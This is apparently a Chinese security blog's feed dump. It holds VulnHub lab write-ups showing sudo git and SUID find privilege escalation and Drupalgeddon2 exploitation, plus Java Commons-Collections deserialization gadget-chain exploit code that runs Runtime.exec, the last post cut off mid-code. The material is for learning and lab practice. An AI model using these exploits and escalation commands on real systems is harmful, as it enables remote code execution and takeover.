src="/../../../../../pic/image-20230202050451674.png"></p><p>可以使用 git 命令，可以使用 git 提权</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">git</span> <span class="token builtin class-name">help</span> config<span class="token operator">!</span>/bin/bash<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/../../../../../pic/image-20230202050742826.png"></p><p>读取 flag5</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">cat</span> /root/final-flag.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../../../../../pic/image-20230202050925678.png"></p><h2 id="5-小结"><a href="#5-小结" class="headerlink" title="5. 小结"></a>5. 小结</h2><ul><li>rbash 绕过</li><li>sudo git 提权</li></ul>]]></content>
      
      
      <categories>
          
          <category> 渗透测试靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> VulnHub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VulnHub - DC_1</title>
      <link href="/2023/02/01/penetrationstest/ba-chang-xue-xi/vulnhub/dc-xi-lie/vulnhub-dc-1/"/>
      <url>/2023/02/01/penetrationstest/ba-chang-xue-xi/vulnhub/dc-xi-lie/vulnhub-dc-1/</url>
      
        <content type="html"><![CDATA[<h1 id="VulnHub-DC-1"><a href="#VulnHub-DC-1" class="headerlink" title="VulnHub - DC_1"></a>VulnHub - DC_1</h1><h2 id="1-环境搭建"><a href="#1-环境搭建" class="headerlink" title="1. 环境搭建"></a>1. 环境搭建</h2><ul><li><p>靶场地址：<a href="https://www.vulnhub.com/entry/dc-1,292/">VulnHub 链接</a></p></li><li><p>难度：简单</p></li><li><p>靶机目标：获取 5 个 flag</p></li></ul><h2 id="2-信息收集"><a href="#2-信息收集" class="headerlink" title="2. 信息收集"></a>2. 信息收集</h2><h3 id="2-1-主机发现"><a href="#2-1-主机发现" class="headerlink" title="2.1 主机发现"></a>2.1 主机发现</h3><p>使用 namp 进行主机探测</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-sP</span> <span class="token number">192.168</span>.0.0/24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../../../../../pic/image-20230201205508197.png"></p><h3 id="2-2-端口扫描"><a href="#2-2-端口扫描" class="headerlink" title="2.2 端口扫描"></a>2.2 端口扫描</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-sV</span> <span class="token parameter variable">-sC</span> -p- <span class="token parameter variable">-T4</span> <span class="token number">192.168</span>.0.119<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../../../../../pic/image-20230201205550509.png"></p><p>开放了 22,80,111，38850</p><h2 id="3-WEB-渗透"><a href="#3-WEB-渗透" class="headerlink" title="3. WEB 渗透"></a>3. WEB 渗透</h2><p>先探测下使用到的技术</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">whatweb http://192.168.0.119/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../../../../../pic/image-20230201205712005.png"></p><p>使用到了 Drupal 7  进行搭建，访问主页</p><p>爆破弱口令无果，查看下是否存在历史漏洞</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">searchsploit Drupal<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../../../../../pic/image-20230201210159828.png"></p><p>使用 MSF 获得 shell，这里使用 <code>exploit/unix/webapp/drupal_drupalgeddon2</code></p><p><img src="/../../../../../pic/image-20230201230059609.png"></p><p>这就获得了 shell，，，，</p><h2 id="4-提权"><a href="#4-提权" class="headerlink" title="4. 提权"></a>4. 提权</h2><p>先搜索下 flag</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">find</span> / <span class="token parameter variable">-name</span> <span class="token string">"*flag*"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../../../../../pic/image-20230202010440566.png"></p><p>这里的 flag4 在 用户 flag4 的目录下，权限不足</p><p>先读取 flag1</p><p><img src="/../../../../../pic/image-20230201230501954.png"></p><p>提示配置文件，Drupal 的配置文件为 ./sites/default/settings.php，读取一下获得 flag2</p><p><img src="/../../../../../pic/image-20230201231949309.png"></p><p>提示不要去爆破账户，同时给出了数据库账户，那就去数据库里面找一下</p><p><img src="/../../../../../pic/image-20230201232435455.png"></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">mysql <span class="token parameter variable">-udbuser</span> <span class="token parameter variable">-pR0ck3t</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>从数据库中获得账户</p><p><img src="/../../../../../pic/image-20230201232629194.png"></p><p>密码是经过加密过的，在目录下存在一个加密脚本，拿来生成一个新的密码</p><p><img src="/../../../../../pic/image-20230201234240337.png"></p><p>将这个新密码写入到数据库中</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">UPDATE users SET pass='$S$DhyZmUIAKJ07D4cGfrQNEf.06G2fULjgsc20HvRSshCiF/dVgi74' WHERE name='admin';<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../../../../../pic/image-20230201234723423.png"></p><p>然后使用 admin / admin 登录，找到 flag3</p><p><img src="/../../../../../pic/image-20230202000108540.png"></p><p>这里提示 -exec </p><p>查找一下是否存在可利用的 suid 提权</p><h3 id="4-1-SUID-提权"><a href="#4-1-SUID-提权" class="headerlink" title="4.1 SUID 提权"></a>4.1 SUID 提权</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">find</span> / <span class="token parameter variable">-perm</span> <span class="token parameter variable">-u</span><span class="token operator">=</span>s <span class="token parameter variable">-type</span> f <span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span>/dev/null<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../../../../../pic/image-20230202011323028.png"></p><p>这里存在一个 find 命令，find 有一个 -exec 参数，该参数在找到文件时可以执行命令</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">touch</span> helloworld<span class="token function">find</span> / <span class="token parameter variable">-name</span> <span class="token string">"helloworld"</span> <span class="token parameter variable">-exec</span> <span class="token string">"whoami"</span> <span class="token punctuation">\</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/../../../../../pic/image-20230202011731688.png"></p><p>转shell</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">find</span> / <span class="token parameter variable">-name</span> <span class="token string">"helloworld"</span> <span class="token parameter variable">-exec</span> <span class="token string">"/bin/sh"</span> <span class="token punctuation">\</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>读取 flag4</p><p><img src="/../../../../../pic/image-20230202012018618.png"></p><p>读取 flag5</p><p><img src="/../../../../../pic/image-20230202012123872.png"></p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> VulnHub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java 反序列化 Commons-Collections 篇 DualLinkedHashBidiMap 链</title>
      <link href="/2023/01/30/skilllearning/java-an-quan/java-fan-xu-lie-hua/commons-collections-pian/java-fan-xu-lie-hua-commons-collections-pian-duallinkedhashbidimap-lian/"/>
      <url>/2023/01/30/skilllearning/java-an-quan/java-fan-xu-lie-hua/commons-collections-pian/java-fan-xu-lie-hua-commons-collections-pian-duallinkedhashbidimap-lian/</url>
      
        <content type="html"><![CDATA[<h1 id="Java-反序列化-Commons-Collections-篇-DualLinkedHashBidiMap-链"><a href="#Java-反序列化-Commons-Collections-篇-DualLinkedHashBidiMap-链" class="headerlink" title="Java 反序列化 Commons-Collections 篇 DualLinkedHashBidiMap 链"></a>Java 反序列化 Commons-Collections 篇 DualLinkedHashBidiMap 链</h1><h2 id="1-前言"><a href="#1-前言" class="headerlink" title="1. 前言"></a>1. 前言</h2><p>在 commons-collections 4.0 版本下新增了一个 DualLinkedHashBidiMap 类</p><h2 id="2-版本搭建"><a href="#2-版本搭建" class="headerlink" title="2. 版本搭建"></a>2. 版本搭建</h2><ul><li><p>java 1.8.0_352</p></li><li><p>commons-collections 4.0</p></li></ul><h2 id="3-DualLinkedHashBidiMap-链分析"><a href="#3-DualLinkedHashBidiMap-链分析" class="headerlink" title="3. DualLinkedHashBidiMap 链分析"></a>3. DualLinkedHashBidiMap 链分析</h2><p>查看 DualLinkedHashBidiMap.readObject() 方法</p><p><img src="/../../../../../pic/image-20230130174235896.png"></p><p>这里的 normalMap 与 reverseMap 使用 LinkedHashMap 进行赋值，查看了一下 LinkedHashMap 中没有可利用的点，干脆使用反射修改 normalMap 为 HashMap 去调用 TiedMapEntry.hashCode() 方法</p><h2 id="4-DualLinkedHashBidiMap-链-EXP-编写"><a href="#4-DualLinkedHashBidiMap-链-EXP-编写" class="headerlink" title="4. DualLinkedHashBidiMap 链 EXP 编写"></a>4. DualLinkedHashBidiMap 链 EXP 编写</h2><ul><li>Exploit</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">org<span class="token punctuation">.</span>example</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections4<span class="token punctuation">.</span></span><span class="token class-name">Transformer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections4<span class="token punctuation">.</span>bidimap<span class="token punctuation">.</span></span><span class="token class-name">DualLinkedHashBidiMap</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections4<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">ChainedTransformer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections4<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">ConstantTransformer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections4<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">InvokerTransformer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections4<span class="token punctuation">.</span>keyvalue<span class="token punctuation">.</span></span><span class="token class-name">TiedMapEntry</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections4<span class="token punctuation">.</span>map<span class="token punctuation">.</span></span><span class="token class-name">LazyMap</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token operator">*</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Field</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">HashMap</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Exploit</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">ClassNotFoundException</span><span class="token punctuation">,</span> <span class="token class-name">NoSuchFieldException</span><span class="token punctuation">,</span> <span class="token class-name">IllegalAccessException</span> <span class="token punctuation">{</span>        <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span> transformers <span class="token operator">=</span> <span class="token punctuation">{</span>                <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span><span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"getMethod"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"getRuntime"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"invoke"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token class-name">Object</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"calc"</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token punctuation">}</span><span class="token punctuation">;</span>        <span class="token class-name">ChainedTransformer</span> chainedTransformer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ChainedTransformer</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">&gt;</span></span> hashMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">LazyMap</span> lazyMap <span class="token operator">=</span> <span class="token class-name">LazyMap</span><span class="token punctuation">.</span><span class="token function">lazyMap</span><span class="token punctuation">(</span>hashMap<span class="token punctuation">,</span> chainedTransformer<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">TiedMapEntry</span> tiedMapEntry <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TiedMapEntry</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span>lazyMap<span class="token punctuation">,</span> <span class="token string">"key"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">&gt;</span></span> expHashMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        expHashMap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>tiedMapEntry<span class="token punctuation">,</span> <span class="token string">"value"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">DualLinkedHashBidiMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">&gt;</span></span> dualLinkedHashBidiMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DualLinkedHashBidiMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Field</span> normalMap <span class="token operator">=</span> <span class="token class-name">DualLinkedHashBidiMap</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getSuperclass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"normalMap"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        normalMap<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        normalMap<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>dualLinkedHashBidiMap<span class="token punctuation">,</span> expHashMap<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Field</span> iTransformers <span class="token operator">=</span> <span class="token class-name">ChainedTransformer</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"iTransformers"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        iTransformers<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        iTransformers<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>chainedTransformer<span class="token punctuation">,</span> transformers<span class="token punctuation">)</span><span class="token punctuation">;</span>        lazyMap<span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span><span class="token string">"key"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 序列化</span>        <span class="token class-name">ByteArrayOutputStream</span> byteArrayOutputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ByteArrayOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">ObjectOutputStream</span> objectOutputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span>byteArrayOutputStream<span class="token punctuation">)</span><span class="token punctuation">;</span>        objectOutputStream<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>dualLinkedHashBidiMap<span class="token punctuation">)</span><span class="token punctuation">;</span>        objectOutputStream<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 反序列化</span>        <span class="token class-name">ByteArrayInputStream</span> byteArrayInputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ByteArrayInputStream</span><span class="token punctuation">(</span>byteArrayOutputStream<span class="token punctuation">.</span><span class="token function">toByteArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">ObjectInputStream</span> objectInputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span>byteArrayInputStream<span class="token punctuation">)</span><span class="token punctuation">;</span>        objectInputStream<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Java 安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CC 链 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java 反序列化 Commons-Collections 篇 DualTreeBidiMap 链</title>
      <link href="/2023/01/30/skilllearning/java-an-quan/java-fan-xu-lie-hua/commons-collections-pian/java-fan-xu-lie-hua-commons-collections-pian-dualtreebidimap-lian/"/>
      <url>/2023/01/30/skilllearning/java-an-quan/java-fan-xu-lie-hua/commons-collections-pian/java-fan-xu-lie-hua-commons-collections-pian-dualtreebidimap-lian/</url>
      
        <content type="html"><![CDATA[<h1 id="Java-反序列化-Commons-Collections-篇-DualTreeBidiMap-链"><a href="#Java-反序列化-Commons-Collections-篇-DualTreeBidiMap-链" class="headerlink" title="Java 反序列化 Commons-Collections 篇 DualTreeBidiMap 链"></a>Java 反序列化 Commons-Collections 篇 DualTreeBidiMap 链</h1><h2 id="1-前言"><a href="#1-前言" class="headerlink" title="1. 前言"></a>1. 前言</h2><p>在 <a href="https://www.anquanke.com/post/id/232415">Java反序列化之与JDK版本无关的利用链挖掘</a> 文章结尾处提到了 DualTreeBidiMap，这里也跟进分析一下</p><h2 id="2-环境搭建"><a href="#2-环境搭建" class="headerlink" title="2. 环境搭建"></a>2. 环境搭建</h2><ul><li><p>java 1.8.0_352</p></li><li><p>commons-collections 4.0</p></li></ul><h2 id="3-DualTreeBidiMap-链分析"><a href="#3-DualTreeBidiMap-链分析" class="headerlink" title="3. DualTreeBidiMap 链分析"></a>3. DualTreeBidiMap 链分析</h2><p>查看 readObject()</p><p><img src="/../../../../../pic/image-20230130164619203.png"></p><p>和 DualHashBidiMap 相同，一样是调用 putAll() 方法来处理传入的 map，但是这里的 maps 被赋值为 TreeMap 并使用 comparator 进行初始化</p><p>看一下 comparator 值从哪里来</p><p><img src="/../../../../../pic/image-20230130172117741.png"></p><p>在构造函数中可以控制 comparator 的值</p><p>在 DualHashBidiMap 中使用 HashMap.containsKey() 方法调用 TiedMapEntry.hashCode() 方法，这里查看下 TreeMap.containsKey() 方法是否能一样利用</p><p><img src="/../../../../../pic/image-20230130164814593.png"></p><p>调用 TiedMapEntry.getEntry() 方法进一步处理 key ，跟进查看一下</p><p><img src="/../../../../../pic/image-20230130164836711.png"></p><p>可以发现不再调用 hashCode() 方法，这里看到在 comparator 不为空的情况下会去调用 getEntryUsingComparator() 方法<img src="/../../../../../pic/image-20230130165036056.png"></p><p>存在 compare() 方法调用但是这里的 root 不好控制，containsKey() 方法用不了了再回去看 putAll 方法</p><p><img src="/../../../../../pic/image-20230130171145595.png"></p><p>还调用了 TreeMap.put() 方法</p><p><img src="/../../../../../pic/image-20230130171403954.png"></p><p>在 root 为空的情况下调用了 compare() 方法，而这里的 root 默认为空也就是说可以直接进入到 compare() 方法中</p><p><img src="/../../../../../pic/image-20230130171745165.png"></p><p>这里 compare 的处理也很简单，判断 comparator 是否为空，不为空的情况下直接调用 comparator.compare() 方法</p><p>查看下这里的  comparator 如何控制</p><p><img src="/../../../../../pic/image-20230130172802513.png"></p><p>也是在构造函数中进行赋值，都可控的情况下就需要一个危险的 compare() 方法，而在 CC2 中使用到了 TransformingComparator，这个类的 compare 方法可以调用 transform 方法，但是这个类只能在 4.0 版本下才可以进行序列化</p><p><img src="/../../../../../pic/image-20230130165451783.png"></p><p>到此利用链就很明确了</p><h3 id="3-1-利用链"><a href="#3-1-利用链" class="headerlink" title="3.1 利用链"></a>3.1 利用链</h3><pre class="line-numbers language-none"><code class="language-none">DualTreeBidiMap.readObject()AbstractDualBidiMap.putAll()AbstractDualBidiMap.put()TreeMap.put()TreeMap.compare()TransformingComparator.compare()ChainedTransformer.transform()ConstantTransformer.transform()InvokerTransformer.transform()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="4-DualTreeBidiMap-链-EXP-编写"><a href="#4-DualTreeBidiMap-链-EXP-编写" class="headerlink" title="4. DualTreeBidiMap 链 EXP 编写"></a>4. DualTreeBidiMap 链 EXP 编写</h2><ul><li>Exploit</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">org<span class="token punctuation">.</span>example</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections4<span class="token punctuation">.</span></span><span class="token class-name">Transformer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections4<span class="token punctuation">.</span>bidimap<span class="token punctuation">.</span></span><span class="token class-name">DualTreeBidiMap</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections4<span class="token punctuation">.</span>comparators<span class="token punctuation">.</span></span><span class="token class-name">TransformingComparator</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections4<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">ChainedTransformer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections4<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">ConstantTransformer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections4<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">InvokerTransformer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token operator">*</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Field</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Exploit</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">ClassNotFoundException</span><span class="token punctuation">,</span> <span class="token class-name">NoSuchFieldException</span><span class="token punctuation">,</span> <span class="token class-name">IllegalAccessException</span> <span class="token punctuation">{</span>        <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span> transformers <span class="token operator">=</span> <span class="token punctuation">{</span>                <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span><span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"getMethod"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"getRuntime"</span><span class="token 